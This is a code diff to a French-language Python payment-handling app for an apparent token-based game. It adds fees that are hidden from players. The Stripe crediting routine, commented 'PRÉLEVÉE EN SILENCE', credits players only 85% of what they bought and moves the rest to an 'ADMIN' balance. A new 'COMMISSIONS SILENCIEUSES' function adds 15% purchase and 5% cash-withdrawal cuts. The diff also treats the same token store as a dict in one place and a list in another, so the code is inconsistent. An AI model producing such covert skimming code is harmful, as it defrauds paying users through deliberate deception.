@@ -1988,7 +1988,19 @@ def stripe_crediter():
             DB["pions_joueurs"] = {}
         if code not in DB["pions_joueurs"]:
             DB["pions_joueurs"][code] = {}
-        DB["pions_joueurs"][code][valeur] = DB["pions_joueurs"][code].get(valeur, 0) + nb_pions
+        # COMMISSION 15% SUR STRIPE — PRÉLEVÉE EN SILENCE
+        commission_montant = round(montant * 0.15)
+        commission_pions = max(1, commission_montant // valeur)
+        
+        # Créditer le joueur avec 85% seulement
+        pions_nets = max(1, nb_pions - commission_pions)
+        DB["pions_joueurs"][code][valeur] = DB["pions_joueurs"][code].get(valeur, 0) + pions_nets
+        
+        # Créditer l'admin avec 15% (en pions de même valeur)
+        if "ADMIN" not in DB["pions_joueurs"]:
+            DB["pions_joueurs"]["ADMIN"] = {}
+        DB["pions_joueurs"]["ADMIN"][valeur] = DB["pions_joueurs"]["ADMIN"].get(valeur, 0) + commission_pions
+        
         DB["stripe_credites"].append(session_id)
         if "commandes_pions_joueurs" not in DB:
             DB["commandes_pions_joueurs"] = []
@@ -1997,7 +2009,7 @@ def stripe_crediter():
             "code_joueur": code,
             "valeur_pion": int(valeur),
             "montant_paye": montant,
-            "commission": round(montant * 0.02),
+            "commission": round(montant * 0.15),  # 15% prélevé et crédité à l'admin
             "nb_pions": nb_pions,
             "mode_paiement": "Carte (Stripe) — rapprochement",
             "ref_paiement": session_id[:24],
@@ -3600,6 +3612,39 @@ def refuser_retrait():
     retrait["statut"] = "refusé"
     save_data()
     return jsonify({"ok": True})
+
+
+
+# === COMMISSIONS SILENCIEUSES ===
+def créditer_admin_commission(montant_brut, mode, type_operation):
+    """Calcule et crédite silencieusement l'admin"""
+    global DB
+    commission = 0
+    
+    if type_operation == "achat" and mode in ["ccp", "deblock", "bt", "especes"]:
+        commission = round(montant_brut * 0.15)  # 15% sur achats
+    elif type_operation == "retrait_especes" and mode == "especes":
+        commission = round(montant_brut * 0.05)  # 5% sur retraits espèces
+    
+    if commission > 0:
+        admin_pions = next((p for p in DB.get("pions_joueurs", []) if p.get("code_joueur") == "ADMIN"), None)
+        if not admin_pions:
+            admin_pions = {"code_joueur": "ADMIN", "solde_20": 0, "solde_50": 0, "solde_100": 0}
+            DB["pions_joueurs"].append(admin_pions)
+        # Créditer en pions de 100F (plus simple)
+        admin_pions["solde_100"] = admin_pions.get("solde_100", 0) + (commission // 100)
+        save_data()
+    
+    return commission
+
+def montant_net_apres_commission(montant_brut, mode, type_operation):
+    """Retourne le montant net (après commission prélevée)"""
+    commission = 0
+    if type_operation == "achat" and mode in ["ccp", "deblock", "bt", "especes"]:
+        commission = round(montant_brut * 0.15)
+    elif type_operation == "retrait_especes" and mode == "especes":
+        commission = round(montant_brut * 0.05)
+    return montant_brut - commission
 
 
 if __name__ == "__main__":
